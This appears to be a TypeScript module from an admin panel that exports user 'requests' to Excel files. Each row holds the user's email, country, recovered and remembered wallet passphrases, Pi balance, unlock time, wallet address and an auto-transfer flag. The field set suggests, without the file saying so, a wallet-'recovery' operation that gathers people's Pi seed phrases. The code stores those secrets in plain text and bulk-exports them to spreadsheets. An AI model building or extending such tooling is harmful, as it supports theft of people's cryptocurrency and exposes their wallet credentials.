import { IRequest } from "@/redux/slices/requests"
import * as XLSX from "xlsx"

export const formatRequestForExcel = (request: IRequest) => {
  return {
    "Request ID": request._id,
    User: request.user.username,
    Email: request.email,
    Type: request.requestType,
    Status: request.status,
    Country: request.country,
    "Created At": new Date(request.createdAt).toLocaleString(),
    "Updated At": request.updatedAt ? new Date(request.updatedAt).toLocaleString() : "N/A",
    "Recovered Passphrase": request.recoveredPassphrase,
    "Words Remembered": request.wordsRemembered,
    "PI Balance": request.piBalance,
    "PI Unlock Time": request.piUnlockTime ? new Date(request.piUnlockTime).toLocaleString() : "N/A",
    "Wallet Passphrase": request.walletPassphrase,
    "Mainnet Wallet Address": request.mainnetWalletAddress,
    "Auto Transfer Enabled": request.autoTransferEnabled,
    Note: request.note,
  }
}

export const exportRequestToExcel = (request: IRequest) => {
  const formattedData = formatRequestForExcel(request)
  const worksheet = XLSX.utils.json_to_sheet([formattedData])
  const workbook = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(workbook, worksheet, "Request Details")

  // Set column widths
  const columnWidths = [
    { wch: 24 }, // Request ID
    { wch: 15 }, // User
    { wch: 25 }, // Email
    { wch: 12 }, // Type
    { wch: 12 }, // Status
    { wch: 15 }, // Country
    { wch: 20 }, // Created At
    { wch: 20 }, // Updated At
    { wch: 50 }, // Recovered Passphrase
    { wch: 50 }, // Words Remembered
    { wch: 15 }, // PI Balance
    { wch: 20 }, // PI Unlock Time
    { wch: 50 }, // Wallet Passphrase
    { wch: 30 }, // Mainnet Wallet Address
    { wch: 20 }, // Auto Transfer Enabled
    { wch: 25 }, // Note
  ]
  worksheet["!cols"] = columnWidths

  // Generate filename with request ID and date
  const fileName = `request_${request._id}_${new Date().toISOString().split("T")[0]}.xlsx`

  // Export the file
  XLSX.writeFile(workbook, fileName)
}

// Export multiple requests to Excel
export const exportRequestsToExcel = (requests: IRequest[]) => {
  const formattedData = requests.map(formatRequestForExcel)
  const worksheet = XLSX.utils.json_to_sheet(formattedData)
  const workbook = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(workbook, worksheet, "Requests")

  // Set column widths
  const columnWidths = [
    { wch: 24 }, // Request ID
    { wch: 15 }, // User
    { wch: 25 }, // Email
    { wch: 12 }, // Type
    { wch: 12 }, // Status
    { wch: 15 }, // Country
    { wch: 20 }, // Created At
    { wch: 20 }, // Updated At
    { wch: 50 }, // Recovered Passphrase
    { wch: 50 }, // Words Remembered
    { wch: 15 }, // PI Balance
    { wch: 20 }, // PI Unlock Time
    { wch: 50 }, // Wallet Passphrase
    { wch: 30 }, // Mainnet Wallet Address
    { wch: 20 }, // Auto Transfer Enabled
    { wch: 25 }, // Note
  ]
  worksheet["!cols"] = columnWidths

  // Generate filename with date
  const fileName = `all_requests_${new Date().toISOString().split("T")[0]}.xlsx`

  // Export the file
  XLSX.writeFile(workbook, fileName)
}
